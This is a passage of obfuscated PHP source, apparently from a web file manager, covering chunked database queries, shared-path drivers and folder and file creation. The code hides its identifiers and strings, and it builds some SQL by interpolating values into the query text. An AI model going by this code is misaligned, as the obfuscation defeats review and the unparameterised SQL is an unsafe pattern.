(!is_array($Ñ¬»“¬)) { return $Ñ¬»“¬; } $‡èÔÛ’¡ = array(); $ï¹ÔáĞ = 0; foreach ($Ñ¬»“¬ as $Ç¯¦ÍØí => $«üøüª—) { if (is_array($«üøüª—) && count($«üøüª—) == 2 && $«üøüª—[0] == $ãæ¾‘‚Ó[421] && is_string($«üøüª—[1]) && substr($«üøüª—[1], 0, 1) == $ãæ¾‘‚Ó[422] && substr($«üøüª—[1], strlen($«üøüª—[1]) - 1, 1) == $ãæ¾‘‚Ó[422]) { $ëÓëÍï = !0; $´şõù¸Æ = is_string($Ç¯¦ÍØí) ? $Ç¯¦ÍØí : $¹ğìê€; $·¹õ™¯ş = substr($«üøüª—[1], 1, strlen($«üøüª—[1]) - 2); $·¹õ™¯ş = $this->db->escapeString($·¹õ™¯ş); if (!strpos($´şõù¸Æ, $ãæ¾‘‚Ó[10])) { $´şõù¸Æ = $ãæ¾‘‚Ó[423] . $´şõù¸Æ . $ãæ¾‘‚Ó[423]; } $ĞÀœà™§ = $ãæ¾‘‚Ó[199] . $·¹õ™¯ş . $ãæ¾‘‚Ó[199]; $·¹õ™¯ş = str_replace(array($ãæ¾‘‚Ó[10], $ãæ¾‘‚Ó[424], $ãæ¾‘‚Ó[11]), $ãæ¾‘‚Ó[425], $·¹õ™¯ş); if ($³¨¢í¡‹[$ãæ¾‘‚Ó[426]]) { $ĞÀœà™§ = $ãæ¾‘‚Ó[427] . $·¹õ™¯ş . $ãæ¾‘‚Ó[428]; if ($³¨¢í¡‹[$ãæ¾‘‚Ó[429]]) { $ĞÀœà™§ = $ãæ¾‘‚Ó[428] . $·¹õ™¯ş . $ãæ¾‘‚Ó[427]; } } $‡èÔÛ’¡[$ï¹ÔáĞ] = $ãæ¾‘‚Ó[430] . $´şõù¸Æ . $ãæ¾‘‚Ó[431] . $ĞÀœà™§ . $ãæ¾‘‚Ó[432]; $ï¹ÔáĞ++; continue; } if (is_array($«üøüª—)) { $¹ğìê€ = is_string($Ç¯¦ÍØí) ? $Ç¯¦ÍØí : $¹ğìê€; $«üøüª— = $this->parseWhereLike($«üøüª—, $¹ğìê€, !0, $ëÓëÍï); } if (is_numeric($Ç¯¦ÍØí)) { $‡èÔÛ’¡[$ï¹ÔáĞ] = $«üøüª—; $ï¹ÔáĞ++; } else { $‡èÔÛ’¡[$Ç¯¦ÍØí] = $«üøüª—; } } if ($ëÓëÍï && !$òŞàÊ£) { } return $‡èÔÛ’¡; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ªæÚô± = array()) { $ŒŸöå =& $_SERVER[”ú…±Ú¥]; $«±º„‚ = self::SQL_WHERE_IN_CHUNK; $Éå¯å¹Ä = $this->optionsValue(); $ºüÊæø = $this->findWhereField($Éå¯å¹Ä); if (!$ºüÊæø || isset($Éå¯å¹Ä[$ŒŸöå[330]]) || isset($Éå¯å¹Ä[$ŒŸöå[391]])) { return parent::select($ªæÚô±); } $úŒÎßË = $Éå¯å¹Ä[$ŒŸöå[313]][$ºüÊæø][1]; $úŒÎßË = is_array($úŒÎßË) ? $úŒÎßË : array(); $í“ó –‘ = null; for ($øã»şœï = 0; $øã»şœï < count($úŒÎßË); $øã»şœï += $«±º„‚) { $¬ˆ¾øôñ = array_slice($úŒÎßË, $øã»şœï, $«±º„‚); if (!is_array($¬ˆ¾øôñ) || count($¬ˆ¾øôñ) == 0) { break; } $Éå¯å¹Ä[$ŒŸöå[313]][$ºüÊæø][1] = $¬ˆ¾øôñ; $this->optionsValue($Éå¯å¹Ä); $ıÜí€­¢ = parent::select($ªæÚô±); if (!$ıÜí€­¢) { continue; } $í“ó –‘ = is_array($í“ó –‘) ? $í“ó –‘ : array(); $í“ó –‘ = array_merge($í“ó –‘, $ıÜí€­¢); } return $í“ó –‘; } public function delete($¡ÊŒö’Ş = array()) { $öÚ—¶«• =& $_SERVER[”ú…±Ú¥]; $ìôË®·Æ = self::SQL_WHERE_IN_CHUNK; $èøÆ¤ò = $this->optionsValue(); $ÄØıöü¿ = $this->findWhereField($èøÆ¤ò); if (!$ÄØıöü¿) { return parent::delete($¡ÊŒö’Ş); } $ğ¥ÌÈğ = 0; $ñ ²Å´ˆ = $èøÆ¤ò[$öÚ—¶«•[313]][$ÄØıöü¿][1]; $ñ ²Å´ˆ = is_array($ñ ²Å´ˆ) ? $ñ ²Å´ˆ : array(); for ($âóî€ç÷ = 0; $âóî€ç÷ < count($ñ ²Å´ˆ); $âóî€ç÷ += $ìôË®·Æ) { $òç¬²¿Ä = array_slice($ñ ²Å´ˆ, $âóî€ç÷, $ìôË®·Æ); if (!is_array($òç¬²¿Ä) || count($òç¬²¿Ä) == 0) { break; } $èøÆ¤ò[$öÚ—¶«•[313]][$ÄØıöü¿][1] = $òç¬²¿Ä; $this->optionsValue($èøÆ¤ò); $ğ¥ÌÈğ += parent::delete($¡ÊŒö’Ş); } return $ğ¥ÌÈğ; } private function findWhereField($Àì¶¤Íµ) { $Ç™‡›¤ =& $_SERVER[”ú…±Ú¥]; $¡¦Ê”Æõ = self::SQL_WHERE_IN_CHUNK; if (!is_array($Àì¶¤Íµ) || !is_array($Àì¶¤Íµ[$Ç™‡›¤[313]])) { return !1; } foreach ($Àì¶¤Íµ[$Ç™‡›¤[313]] as $õï·¾—õ => $¼ÛÉÇ) { if (is_array($¼ÛÉÇ) && isset($¼ÛÉÇ[0]) && is_string($¼ÛÉÇ[0]) && strtolower($¼ÛÉÇ[0]) == $Ç™‡›¤[7] && is_array($¼ÛÉÇ[1]) && count($¼ÛÉÇ[1]) > $¡¦Ê”Æõ) { ignore_timeout(); return $õï·¾—õ; } } return !1; } public function setMasterDB($ÏêËÈÁë = true) { think_config($_SERVER[”ú…±Ú¥][433], $ÏêËÈÁë); } } goto b“Æåéó; DéÊ„°„İç: class PathDriverDbShareItem extends PathDriverDB { public function __construct($¶“òŞ‰) { $this->pathParse = $¶“òŞ‰; $this->model = Model($_SERVER[”ú…±Ú¥][1362]); } public function getPathOuter($ü“¹È¾´) { $ïÅ¦…ïá =& $_SERVER[”ú…±Ú¥]; if (!$ü“¹È¾´) { return $ü“¹È¾´; } $Î‘ê¨ª· = $this->parse($ü“¹È¾´); return trim(KodIO::makeShare($this->pathParse[$ïÅ¦…ïá[437]], $Î‘ê¨ª·[$ïÅ¦…ïá[437]]), $ïÅ¦…ïá[8]); } protected function infoParse($´Ô¢õ¶“, $ØÂ¦Ş¹Ş = false, $éï÷ñı = false) { $¼ƒ—´à =& $_SERVER[”ú…±Ú¥]; $ß¯ŞÜÉ© = $this->pathParse[$¼ƒ—´à[437]]; $ŞÑØşî = trim($this->pathParse[$¼ƒ—´à[1197]], $¼ƒ—´à[8]); return Action($¼ƒ—´à[1370])->sharePathInfo($ß¯ŞÜÉ©, $ŞÑØşî, $ØÂ¦Ş¹Ş); } public function infoFull($âàÊ®ë) { $Èî¬™€ =& $_SERVER[”ú…±Ú¥]; $½Ö¶Óœ¥ = explode($Èî¬™€[8], trim($âàÊ®ë, $Èî¬™€[8])); if (count($½Ö¶Óœ¥) > 1) { $—Ø…¯ïÕ = implode($Èî¬™€[8], array_splice($½Ö¶Óœ¥, 1)); $Á‹õÃƒå = $this->model->pathInfoByPath($½Ö¶Óœ¥[0], $—Ø…¯ïÕ); if (!$Á‹õÃƒå) { return !1; } $this->pathParse[$Èî¬™€[1197]] = $Á‹õÃƒå[$Èî¬™€[440]]; } return $this->infoParse($âàÊ®ë); } public function listAll($É‘û¢çü) { $öÀ¤‰ø¹ =& $_SERVER[”ú…±Ú¥]; $©¤ÕìŠ» = IO::info($this->pathParse[$öÀ¤‰ø¹[84]]); if (!$©¤ÕìŠ») { return array(); } $òø†îõş = $this->model->listAll($É‘û¢çü); $ƒ°›ö§· = Model($öÀ¤‰ø¹[630])->getInfo($©¤ÕìŠ»[$öÀ¤‰ø¹[631]]); foreach ($òø†îõş as &$ôóä»Ê™) { check_abort(); $ôóä»Ê™[$öÀ¤‰ø¹[87]] = Action($öÀ¤‰ø¹[1370])->_shareItemeParse($ôóä»Ê™[$öÀ¤‰ø¹[87]], $ƒ°›ö§·); } unset($ôóä»Ê™); return $òø†îõş; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($¨Úä òù) { $this->pathParse = $¨Úä òù; $this->model = Model($_SERVER[”ú…±Ú¥][1362]); } protected function infoParse($üÁ«º–Æ, $ûÕ‚‡± = false, $İ²ŒìÙ = false) { $ùıùì²¼ =& $_SERVER[”ú…±Ú¥]; return Action($ùıùì²¼[1203])->sharePathInfo($this->pathParse[$ùıùì²¼[84]], !0, $ûÕ‚‡±); } public function listPath($è©·ÚÕô, $“¶”»ÒŒ = false) { $»¡öÄ« =& $_SERVER[”ú…±Ú¥]; $œ¹íÜÂŸ = parent::listPath($è©·ÚÕô, $“¶”»ÒŒ); if (!$œ¹íÜÂŸ) { return $œ¹íÜÂŸ; } if (is_array($œ¹íÜÂŸ[$»¡öÄ«[1371]])) { $œ¹íÜÂŸ[$»¡öÄ«[1371]] = Action($»¡öÄ«[1203])->shareItemInfo($œ¹íÜÂŸ[$»¡öÄ«[1371]]); } foreach ($œ¹íÜÂŸ as $´œ¦çà› => $×·€õ•­) { if (!in_array($´œ¦çà›, array($»¡öÄ«[83], $»¡öÄ«[82]))) { continue; } foreach ($×·€õ•­ as $Ê¨ÃŸèö => $”íÕŸä°) { $œ¹íÜÂŸ[$´œ¦çà›][$Ê¨ÃŸèö] = Action($»¡öÄ«[1203])->shareItemInfo($”íÕŸä°); } } return $œ¹íÜÂŸ; } public function listAll($ÔÆÄ„) { $óŒÏò–© =& $_SERVER[”ú…±Ú¥]; $ÖàÚ£œö = IO::info($this->pathParse[$óŒÏò–©[84]]); if (!$ÖàÚ£œö) { return array(); } $Ò»¼Î¸‹ = $this->model->listAll($ÔÆÄ„); foreach ($Ò»¼Î¸‹ as &$¾è×’Ûú) { $¾è×’Ûú[$óŒÏò–©[87]] = Action($óŒÏò–©[1203])->shareItemInfo($¾è×’Ûú[$óŒÏò–©[87]]); } unset($¾è×’Ûú); return $Ò»¼Î¸‹; } } class PathDriverDriverShareItem { public function __construct($ŞÔƒ†—½) { $this->pathParse = $ŞÔƒ†—½; } public function __call($Ø‹¾Öû«, $­¯ËŠƒ) { $Ì×Õ®ìº =& $_SERVER[”ú…±Ú¥]; if (method_exists($this, $Ø‹¾Öû«)) { return; } $å•“°½· = call_user_func_array(array($Ì×Õ®ìº[1372], $Ø‹¾Öû«), $­¯ËŠƒ); $Ÿ¿È“Î¶ = array($Ì×Õ®ìº[1373], $Ì×Õ®ìº[1374], $Ì×Õ®ìº[1375], $Ì×Õ®ìº[1376], $Ì×Õ®ìº[584], $Ì×Õ®ìº[586], $Ì×Õ®ìº[1377], $Ì×Õ®ìº[107], $Ì×Õ®ìº[1378], $Ì×Õ®ìº[1379]); if (in_array($Ø‹¾Öû«, $Ÿ¿È“Î¶)) { $å•“°½· = $this->getPathOuter($å•“°½·); } return $å•“°½·; } public function copy($åÌ¹Ù—Œ, $Ã—àÁ¾ï, $“‰¡ö = false, $‹Ñ´¦ß = false) { return $this->copyMove($åÌ¹Ù—Œ, $Ã—àÁ¾ï, $“‰¡ö, $_SERVER[”ú…±Ú¥][584], $‹Ñ´¦ß); } public function move($¹ùüÀŞÀ, $—©¦ÂÍÌ, $ê¯àı¼… = false, $ÄØ€¬­ = false) { return $this->copyMove($¹ùüÀŞÀ, $—©¦ÂÍÌ, $ê¯àı¼…, $_SERVER[”ú…±Ú¥][586], $ÄØ€¬­); } private function copyMove($ñÈşÉãø, $’Û …÷ƒ, $‹éÀµÚ, $ ÆœÅÌÀ, $Û­şôäÁ = false) { $€®‘¤Şï =& $_SERVER[”ú…±Ú¥]; $µá±¤¸â = $’Û …÷ƒ; $Ü†®—ô˜ = IO::driverMake($’Û …÷ƒ); if ($Ü†®—ô˜->pathParse[$€®‘¤Şï[1180]]) { $’Û …÷ƒ = $Ü†®—ô˜->pathParse[$€®‘¤Şï[1180]]; } else { $’Û …÷ƒ = $µá±¤¸â; } $ŞŸÍóÔÛ = IO::copyMove($ñÈşÉãø, $’Û …÷ƒ, $‹éÀµÚ, $ ÆœÅÌÀ, $Û­şôäÁ); $ŞŸÍóÔÛ = $this->getPathOuter($ŞŸÍóÔÛ); return $ŞŸÍóÔÛ; } public function pathThis($›ëÚ’›) { return get_path_this($this->pathParse[$_SERVER[”ú…±Ú¥][84]]); } public function pathFather($Š¸šèßş) { return get_path_father($this->pathParse[$_SERVER[”ú…±Ú¥][84]]); } public function iconvSystem($úÓóı) { return $úÓóı; } protected function infoParse($ø˜îÇ, $ÎÀåõÖæ = false) { $±ı†ŞØõ =& $_SERVER[”ú…±Ú¥]; $©‡ãñËî = $this->pathParse[$±ı†ŞØõ[524]][$±ı†ŞØõ[1204]] . $this->pathParse[$±ı†ŞØõ[1197]]; if ($ÎÀåõÖæ) { $„…¬¸” = IO::infoWithChildren($©‡ãñËî); } else { $„…¬¸” = IO::info($©‡ãñËî); } $ÇÃôœÍÕ = $this->pathParse[$±ı†ŞØõ[524]]; return Action($±ı†ŞØõ[1370])->_shareItemeParse($„…¬¸”, $ÇÃôœÍÕ); } public function listAll($éÍ¥È˜’) { $½÷ïÃÔØ =& $_SERVER[”ú…±Ú¥]; $¦ •šÓò = IO::listAll($éÍ¥È˜’); $ÆÏ€×ôÃ = rtrim($this->pathParse[$½÷ïÃÔØ[524]][$½÷ïÃÔØ[1204]], $½÷ïÃÔØ[8]); foreach ($¦ •šÓò as &$ú¢Àş‘Ç) { $ú¢Àş‘Ç[$½÷ïÃÔØ[84]] = $this->pathDriver . $½÷ïÃÔØ[8] . ltrim(substr($ú¢Àş‘Ç[$½÷ïÃÔØ[84]], strlen($ÆÏ€×ôÃ)), $½÷ïÃÔØ[8]); } unset($ú¢Àş‘Ç); return $¦ •šÓò; } public function listAllSimple($’¢¿ÕÙ‰, $Æé…©Í = false) { $ˆÙĞ¶Úï =& $_SERVER[”ú…±Ú¥]; $­»¬´äú = $this->listAll($’¢¿ÕÙ‰); $“İ£‘¸ = $this->pathParse[$ˆÙĞ¶Úï[459]]; if (trim($“İ£‘¸, $ˆÙĞ¶Úï[8]) == trim(get_path_father($“İ£‘¸), $ˆÙĞ¶Úï[8])) { $Æé…©Í = !0; } return IO::init($ˆÙĞ¶Úï[12])->listAllSimpleMake($­»¬´äú, $“İ£‘¸, $Æé…©Í); } public function getPathOuter($Ò—ã“ë¬) { $©ÈÉ°¹ø =& $_SERVER[”ú…±Ú¥]; $Ìçí¼× = KodIO::parse($Ò—ã“ë¬); if ($Ìçí¼×[$©ÈÉ°¹ø[33]] == KodIO::KOD_SHARE_ITEM) { return $Ìçí¼×[$©ÈÉ°¹ø[84]]; } $úó©´‡š = KodIO::clear($Ò—ã“ë¬); $†ˆ…úºî = KodIO::clear($this->pathParse[$©ÈÉ°¹ø[524]][$©ÈÉ°¹ø[1204]]); $¢­àÄÒ = substr($úó©´‡š, strlen($†ˆ…úºî)); if (substr($úó©´‡š, 0, strlen($†ˆ…úºî)) != $†ˆ…úºî) { return !1; } return $this->pathParse[$©ÈÉ°¹ø[1198]] . $©ÈÉ°¹ø[8] . ltrim($¢­àÄÒ, $©ÈÉ°¹ø[8]); } public function getType() { $‘íâ€¡â =& $_SERVER[”ú…±Ú¥]; $¹…ªÓÚí = str_replace($‘íâ€¡â[74], $‘íâ€¡â[12], get_class($this)); return strtolower($¹…ªÓÚí); } public function isTypeObject($ÚûÃ‹²ş) { return IO::isTypeObject($ÚûÃ‹²ş); } public function info($‡Ì„Â´Á) { return $this->infoParse($‡Ì„Â´Á); } public function infoAuth($—÷á›™é) { return $this->infoParse($—÷á›™é); } public function infoWithChildren($€ßâ¡) { return $this->infoParse($€ßâ¡, !0); } public function infoFull($’íŠŠí) { return $this->infoParse($’íŠŠí); } } goto díäìù“Å; Cç ŸÙøàÚ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($·ÇÁß¯») { $ÊâÉ”Ûº =& $_SERVER[”ú…±Ú¥]; $É¥¸Øáö = Model($ÊâÉ”Ûº[542])->where(array($ÊâÉ”Ûº[1662] => $·ÇÁß¯»))->find(); $“˜¯£¤ = $this->_mkdirRoot(SourceModel::TYPE_USER, $·ÇÁß¯», $É¥¸Øáö[$ÊâÉ”Ûº[32]]); $this->userDesktopAdd($“˜¯£¤); return $“˜¯£¤; } public function userDesktopAdd($ªÓáøüŞ) { $Ş¨“Š æ =& $_SERVER[”ú…±Ú¥]; $îç…¥…ğ = LNG($Ş¨“Š æ[2134]); $¬›ºà = $this->mkdir($ªÓáøüŞ, $îç…¥…ğ); $this->metaSet($¬›ºà, $Ş¨“Š æ[2135], $Ş¨“Š æ[88]); $this->metaSet($ªÓáøüŞ, $Ş¨“Š æ[2136], $¬›ºà); } public function userPathSafeAdd($Äšú‚ÆË) { $¥ıâï—ı =& $_SERVER[”ú…±Ú¥]; $£§Áœªá = Model($¥ıâï—ı[542])->getInfoFull($Äšú‚ÆË); if (!$£§Áœªá) { return !1; } if (_get($£§Áœªá, $¥ıâï—ı[564])) { return $£§Áœªá[$¥ıâï—ı[504]][$¥ıâï—ı[2137]]; } $ÒÎ…Àáı = $this->_mkdirRoot(SourceModel::TYPE_USER, $Äšú‚ÆË, $¥ıâï—ı[2138], $¥ıâï—ı[471]); Model($¥ıâï—ı[542])->metaSet($Äšú‚ÆË, $¥ıâï—ı[2137], $ÒÎ…Àáı); $this->metaSet($ÒÎ…Àáı, $¥ıâï—ı[2139], $Äšú‚ÆË); return $ÒÎ…Àáı; } public function groupRootAdd($éè·´ş“) { $ı¢Á¢Ç¢ =& $_SERVER[”ú…±Ú¥]; $ëÙ·æ˜Ê = Model($ı¢Á¢Ç¢[550])->where(array($ı¢Á¢Ç¢[1949] => $éè·´ş“))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $éè·´ş“, $ëÙ·æ˜Ê[$ı¢Á¢Ç¢[32]]); } public function systemRootPathAdd($çÕÏ–ª±) { if ($çÕÏ–ª± != $_SERVER[”ú…±Ú¥][572]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $çÕÏ–ª±); } public function userRootRemove($Ğš´»µ©) { $²¯òûëå = $this->targetSourceRoot(SourceModel::TYPE_USER, $Ğš´»µ©, !0); foreach ($²¯òûëå as $©—›¼ú) { if (!$©—›¼ú) { continue; } $this->remove($©—›¼ú[$_SERVER[”ú…±Ú¥][440]], !1); } } public function groupRootRemove($××á‘) { $Ó—Ã˜å = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $××á‘); if (!$Ó—Ã˜å) { return; } $this->remove($Ó—Ã˜å[$_SERVER[”ú…±Ú¥][440]], !1); } private function _mkdirRoot($ß€í¨ƒ„, $ÏùáÂôö, $ºñ¦øõ, $‡ÛÁÂô = '') { $‘œ‘ô‘å =& $_SERVER[”ú…±Ú¥]; $÷šš’åÀ = defined($‘œ‘ô‘å[2082]) ? USER_ID : 0; $°äá„Õ = array($‘œ‘ô‘å[439] => 0, $‘œ‘ô‘å[614] => $ß€í¨ƒ„, $‘œ‘ô‘å[615] => $ÏùáÂôö, $‘œ‘ô‘å[612] => 1, $‘œ‘ô‘å[616] => $÷šš’åÀ, $‘œ‘ô‘å[617] => $÷šš’åÀ, $‘œ‘ô‘å[613] => $‡ÛÁÂô, $‘œ‘ô‘å[618] => $‘œ‘ô‘å[559], $‘œ‘ô‘å[468] => 0, $‘œ‘ô‘å[583] => 0, $‘œ‘ô‘å[507] => 0, $‘œ‘ô‘å[619] => $‘œ‘ô‘å[12]); if ($àœ¶à¾½ = $this->where($°äá„Õ)->find()) { return $àœ¶à¾½[$‘œ‘ô‘å[440]]; } $é³õ¢ú = "\x4d\157\x64\x65\x6c\123\157\165\162\x63\145\x2e\155\x6b\144\151\x72\x52\157\x6f\164\x2e{$ß€í¨ƒ„}\x2e{$ÏùáÂôö}\x2e" . $ºñ¦øõ; CacheLock::lock($é³õ¢ú); $°äá„Õ[$‘œ‘ô‘å[32]] = $ºñ¦øõ; $îŞúÎ…• = $this->add($°äá„Õ); $¹‰Ã÷Ïú = array($‘œ‘ô‘å[620] => short_id($îŞúÎ…•)); $this->where(array($‘œ‘ô‘å[455] => $îŞúÎ…•))->save($¹‰Ã÷Ïú); CacheLock::unlock($é³õ¢ú); return $îŞúÎ…•; } private function targetSourceRoot($šòüˆ¹Ğ, $œÃ“³ì‚, $¥ú ©Ë½ = false) { $ûŞì¹ œ =& $_SERVER[”ú…±Ú¥]; $û»ûó€ = array($ûŞì¹ œ[439] => 0, $ûŞì¹ œ[614] => $šòüˆ¹Ğ, $ûŞì¹ œ[615] => $œÃ“³ì‚); if ($¥ú ©Ë½) { $–±éŞ‚© = $this->where($û»ûó€)->select(); return $–±éŞ‚© ? $–±éŞ‚© : array(); } $ºÊúĞª = $this->where($û»ûó€)->find(); return $ºÊúĞª ? $ºÊúĞª : array(); } public function sourceRootGroup($¬á„¤ì®) { $÷Ø™Û¬Ã =& $_SERVER[”ú…±Ú¥]; if (is_string($¬á„¤ì®)) { $¬á„¤ì® = array($¬á„¤ì®); } $„çÔùÇÑ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¬á„¤ì®, $÷Ø™Û¬Ã[199]); $ä­ùÊ¯ø = array($÷Ø™Û¬Ã[407] => $„çÔùÇÑ, $÷Ø™Û¬Ã[404] => array($÷Ø™Û¬Ã[790] => count($¬á„¤ì®))); $this->_listDataApply($ä­ùÊ¯ø[$÷Ø™Û¬Ã[407]]); $this->_listMake($ä­ùÊ¯ø); return array_to_keyvalue($ä­ùÊ¯ø[$÷Ø™Û¬Ã[82]], $÷Ø™Û¬Ã[534]); } public function mkfile($±‚¸É¬ü, $Øİ©Æ©°, $™»ÄùÁ = '', $²ïóÎä‰ = REPEAT_RENAME) { $•…ŒªúÛ =& $_SERVER[”ú…±Ú¥]; $ªÔÚöÂÁ = Model($•…ŒªúÛ[639])->addFileByContent($™»ÄùÁ, $Øİ©Æ©°); return $this->_createFileCall($±‚¸É¬ü, $Øİ©Æ©°, $ªÔÚöÂÁ, $²ïóÎä‰, $•…ŒªúÛ[1373]); } public function addFile($ßÇÖğ¢´, $àŒï¿Ÿä, $ıå¨ë€™, $ÖÁ™á— = false, $–Ú¶ıİÛ = REPEAT_RENAME) { $ÔâÇ¸¡ = Model($_SERVER[”ú…±Ú¥][639])->addFile($àŒï¿Ÿä, $ıå¨ë€™, $ÖÁ™á—); return $this->_createFileCall($ßÇÖğ¢´, $ıå¨ë€™, $ÔâÇ¸¡, $–Ú¶ıİÛ); } public function addFileByFileID($‹º¦ØÓ, $°ÃÓæ„, $ºĞ÷¼–Ç, $ú÷³ÂŒ = REPEAT_RENAME) { $Ë‘âÉçÜ =& $_SERVER[”ú…±Ú¥]; $­×ŠóâÍ = Model($Ë‘âÉçÜ[639])->find($°ÃÓæ„); Model($Ë‘âÉçÜ[639])->linkAdd($°ÃÓæ„); return $this->_createFileCall($‹º¦ØÓ, $ºĞ÷¼–Ç, $­×ŠóâÍ, $ú÷³ÂŒ); } public function addFileByRemote($²ç–õêé, $Í¥Óı, $àÔ•„æ—, $ÓĞ¢Õ¶Š = array(), $Æ‘°µ™ = REPEAT_RENAME) { $Î¡¢òàİ = Model($_SERVER[”ú…±Ú¥][639])->addFileByRemote($Í¥Óı, $àÔ•„æ—, $ÓĞ¢Õ¶Š); return $this->_createFileCall($²ç–õêé, $àÔ•„æ—, $Î¡¢òàİ, $Æ‘°µ™); } private function _createFileCall($Ø†¢ŞÜ, $­ÊËÈæ˜, $”‡Ú¯–, $‰°¨Åªû, $ıÅ—ÏŒØ = "\x75\x70\x6c\157\x61\x64") { $û‰¬¬´Ò =& $_SERVER[”ú…±Ú¥]; $Õ™­«¼® = !1; $this->setMasterDB(); $this->lockWriteStart($Ø†¢ŞÜ, $­ÊËÈæ˜); $ªœ…«îò = $this->fileNameExist($Ø†¢ŞÜ, $­ÊËÈæ˜); $¹ÏÅ®æÛ = $this->_createFile($Ø†¢ŞÜ, $­ÊËÈæ˜, $”‡Ú¯–, $‰°¨Åªû, $Õ™­«¼®); if (!$Õ™­«¼®) { Model($û‰¬¬´Ò[509])->remove($”‡Ú¯–[$û‰¬¬´Ò[506]]); } if ($Õ™­«¼® && $¹ÏÅ®æÛ && $¹ÏÅ®æÛ != $ªœ…«îò) { Model($û‰¬¬´Ò[2107])->eventCreate($¹ÏÅ®æÛ, $ıÅ—ÏŒØ); } $this->lockWriteEnd($Ø†¢ŞÜ, $­ÊËÈæ˜); return $¹ÏÅ®æÛ; } public function mkdir($¤¶ÆÀòÚ, $Ò‘†Ä¿¹, $íÏòÛ†µ = REPEAT_SKIP) { $·êëşŸ =& $_SERVER[”ú…±Ú¥]; $this->setMasterDB(); $Çœ£×§ = $this->sourceInfo($¤¶ÆÀòÚ); if (!$Çœ£×§) { return !1; } $this->lockWriteStart($¤¶ÆÀòÚ, $Ò‘†Ä¿¹); if ($íÏòÛ†µ !== !1) { $ÍÁÚÔ˜å = $this->fileNameExist($¤¶ÆÀòÚ, $Ò‘†Ä¿¹); if ($ÍÁÚÔ˜å && $íÏòÛ†µ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($¤¶ÆÀòÚ, $Ò‘†Ä¿¹); return $ÍÁÚÔ˜å; } $Ò‘†Ä¿¹ = $this->fileNameAuto($¤¶ÆÀòÚ, $Ò‘†Ä¿¹, $íÏòÛ†µ); } $‰á¬Î² = array($·êëşŸ[612] => 1, $·êëşŸ[458] => $Ò‘†Ä¿¹, $·êëşŸ[613] => $·êëşŸ[12], $·êëşŸ[507] => 0, $·êëşŸ[583] => 0); $ ìì’ ç = $this->_addSource($‰á¬Î², $Çœ£×§); Model($·êëşŸ[2107])->eventCreate($ ìì’ ç, $·êëşŸ[1374]); $this->lockWriteEnd($¤¶ÆÀòÚ, $Ò‘†Ä¿¹); return $ ìì’ ç; } public function listSourceRoot($¬ÉÖ·••, $İ³·ª¼, $á˜šáÉŸ = "\x73\157\x75\162\143\x65\x49\x44\x2c\x74\x61\162\x67\145\164\x49\x44\54\x73\151\x7a\145") { $å³ÅÅüø =& $_SERVER[”ú…±Ú¥]; $áëšà¦‡ = $å³ÅÅüø[416]; $¶»šµÆ¡ = array(); $ÎòÌ² é = 1024 * 50; $Îµ±†ù“ = is_array($Îµ±†ù“) ? $Îµ±†ù“ : array(); $ÃÅóŠ»Š = count($İ³·ª¼); $Îûç¾÷ = $this->tablePrefix . $å³ÅÅüø[2140]; for ($ÛÊ–šö = 0; $ÛÊ–šö < $ÃÅóŠ»Š; $ÛÊ–šö++) { $ì€““î = $İ³·ª¼[$ÛÊ–šö]; $áëšà¦‡ .= "\123\105\x4c\x45\x43\x54\x20\x2a\40\x46\122\117\115\x20\50\123\x45\114\x45\103\124\40{$á˜šáÉŸ}\40\x46\x52\x4f\x4d\x20\140{$Îûç¾÷}\x60\x20\x57\110\x45\x52\x45\x20"; $áëšà¦‡ .= "\x60\x70\141\x72\x65\x6e\x74\x49\104\x60\75\60\40\101\x4e\x44\x20\140\164\x61\x72\x67\145\x74\x49\x44\140\x3d{$ì€““î}\40\101\116\x44\40\140\164\x61\x72\147\145\164\124\171\x70\145\140\x3d{$¬ÉÖ·••}\40\x61\x6e\x64\40\x66\x69\154\145\124\x79\160\x65\75\47\47\x20\x6c\151\155\x69\164\40\61\51\x20\141\x73\40\x74\x62\137{$ÛÊ–šö}\40\x55\x4e\111\x4f\x4e\x20\x41\114\x4c\40"; if ((strlen($áëšà¦‡) >= $ÎòÌ² é || $ÛÊ–šö == $ÃÅóŠ»Š - 1) && $áëšà¦‡) { $áëšà¦‡ = substr($áëšà¦‡, 0, -strlen($å³ÅÅüø[1067])); $Ù›ö¤Å = $this->query($áëšà¦‡); $áëšà¦‡ = $å³ÅÅüø[12]; $¶»šµÆ¡ = array_merge($¶»šµÆ¡, $Ù›ö¤Å); } } return $¶»šµÆ¡; } private function _createFile($ÍÜäºˆû, $Çë×…şÛ, $›ÌÂÔñ¯, $šÁĞ©»¸, &$Ñ³Áª) { $ÒüãƒÙ™ =& $_SERVER[”ú…±Ú¥]; $¬áş¢à§ = $this->sourceInfo($ÍÜäºˆû); if (!$›ÌÂÔñ¯ || !$¬áş¢à§) { return !1; } if ($šÁĞ©»¸ !== !1) { $÷ÊÎù• = $this->fileNameExist($ÍÜäºˆû, $Çë×…şÛ); } $Ñ³Áª = !0; if ($šÁĞ©»¸ && $÷ÊÎù•) { if ($šÁĞ©»¸ == REPEAT_SKIP) { $Ñ³Áª = !1; return $÷ÊÎù•; } else { if ($šÁĞ©»¸ == REPEAT_REPLACE) { $—øµåü“ = $this->sourceInfo($÷ÊÎù•); $Ö†™¼Û = $this->fileHistory($—øµåü“, $›ÌÂÔñ¯[$ÒüãƒÙ™[506]], $›ÌÂÔñ¯[$ÒüãƒÙ™[76]]); if (!$Ö†™¼Û) { $Ñ³Áª = !1; } else { $this->folderSizeReset($ÍÜäºˆû); } return $÷ÊÎù•; } else { $Çë×…şÛ = $this->fileNameAuto($ÍÜäºˆû, $Çë×…şÛ, $šÁĞ©»¸, !1); } } } $¾¸şÄƒƒ = array($ÒüãƒÙ™[612] => 0, $ÒüãƒÙ™[458] => $Çë×…şÛ, $ÒüãƒÙ™[613] => substr(get_path_ext($Çë×…şÛ), 0, 10), $ÒüãƒÙ™[507] => $›ÌÂÔñ¯[$ÒüãƒÙ™[506]], $ÒüãƒÙ™[583] 